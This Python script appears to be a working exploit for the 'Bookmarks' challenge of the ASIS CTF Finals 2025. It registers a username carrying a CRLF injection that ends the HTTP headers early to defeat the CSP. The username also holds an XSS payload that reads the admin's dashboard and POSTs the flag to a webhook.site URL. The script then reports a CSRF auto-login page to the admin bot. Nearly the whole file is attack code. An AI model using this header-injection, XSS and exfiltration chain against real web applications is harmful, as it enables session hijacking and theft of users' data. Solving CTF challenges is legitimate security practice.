#!/usr/bin/env python3
"""
ASIS CTF Finals 2025 - Bookmarks Exploit
Simplified version for GitHub Pages hosting
"""

import requests
import random
import string
import urllib.parse

# Configuration - UPDATE THIS!
TARGET_URL = "http://65.109.202.184"
GITHUB_PAGES_URL = "https://YOUR_USERNAME.github.io/YOUR_REPO/github_exploit.html"  # UPDATE THIS!
WEBHOOK_URL = "https://webhook.site/ce81270b-afd7-4d83-bedd-e4854183bed2"

PASSWORD = "password"
FLAG_FORMAT = r"/ASIS\{.*?\}/g"


def create_malicious_username():
    """
    Create a username with CRLF injection to bypass CSP

    The \\r\\n\\r\\n terminates the HTTP headers early, causing:
    - CSP header to be treated as part of the HTML body
    - <script> tag to be executed without CSP protection
    """

    # XSS payload that polls /dashboard for the flag
    xss_payload = f"""
setInterval(function(){{
    a = open('/dashboard');
    a.onload = function(){{
        if(a.document.body.outerHTML.match({FLAG_FORMAT})){{
            fetch('{WEBHOOK_URL}', {{
                method: 'POST',
                body: a.document.body.outerHTML.match({FLAG_FORMAT})[0]
            }});
        }}
        a.close();
    }}
}}, 1000)
""".strip().replace('\n', '')

    # Random suffix to avoid username collision
    random_suffix = ''.join(random.choices(string.ascii_letters, k=4))

    # CRLF injection
    username = f"bubu\\r\\n\\r\\n<script>{xss_payload}</script>{random_suffix}"

    return username


def register(username, password):
    """Register a new user"""
    url = f"{TARGET_URL}/register"
    data = {
        "username": username,
        "password": password
    }

    print(f"[*] Registering user (length: {len(username)} bytes)...")
    response = requests.post(url, data=data)

    if response.status_code == 201:
        print("[+] Registration successful!")
        return True
    elif response.status_code == 409:
        print("[!] Username already exists")
        return False
    else:
        print(f"[-] Registration failed: {response.text}")
        return False


def report(url):
    """Submit URL to admin bot"""
    report_url = f"{TARGET_URL}/report"
    data = {"url": url}

    print(f"[*] Reporting URL to bot...")
    print(f"    URL: {url}")
    response = requests.post(report_url, data=data)
    print(f"[+] Bot response: {response.text}")
    return response


def main():
    print("="*60)
    print("ASIS CTF Finals 2025 - Bookmarks Exploit")
    print("GitHub Pages Version")
    print("="*60)
    print()

    # Validate configuration
    if "YOUR_USERNAME" in GITHUB_PAGES_URL:
        print("[-] ERROR: Please update GITHUB_PAGES_URL first!")
        print()
        print("Steps:")
        print("1. Upload 'github_exploit.html' to your GitHub Pages repository")
        print("2. Update GITHUB_PAGES_URL in this script")
        print("3. Run this script again")
        return

    # Step 1: Create malicious username
    print("[STEP 1] Creating malicious username...")
    malicious_username = create_malicious_username()
    print(f"[+] Username created ({len(malicious_username)} bytes)")
    print()

    # Step 2: Register malicious user
    print("[STEP 2] Registering malicious user...")
    if not register(malicious_username, PASSWORD):
        print("[-] Registration failed! Trying with different random suffix...")
        malicious_username = create_malicious_username()
        if not register(malicious_username, PASSWORD):
            print("[-] Failed again. Exiting.")
            return
    print()

    # Step 3: Build exploit URL with username parameter
    print("[STEP 3] Building exploit URL...")
    encoded_username = urllib.parse.quote(malicious_username)
    exploit_url = f"{GITHUB_PAGES_URL}?u={encoded_username}"
    print(f"[+] Exploit URL: {exploit_url[:100]}...")
    print()

    # Step 4: Send to bot
    print("[STEP 4] Sending exploit URL to bot...")
    report(exploit_url)
    print()

    print("[*] Attack sent! Monitor your webhook URL for the flag:")
    print(f"    {WEBHOOK_URL}")
    print()
    print("[*] Timeline:")
    print("    T+0s   : Bot visits GitHub Pages")
    print("    T+0s   : CSRF auto-login")
    print("    T+1s   : Dashboard opens")
    print("    T+5s   : Bot registers with FLAG")
    print("    T+6s   : Bot logs in with FLAG")
    print("    T+7-12s: XSS finds FLAG and exfiltrates!")
    print()
    print("[!] Wait about 15 seconds for the flag...")


if __name__ == "__main__":
    main()
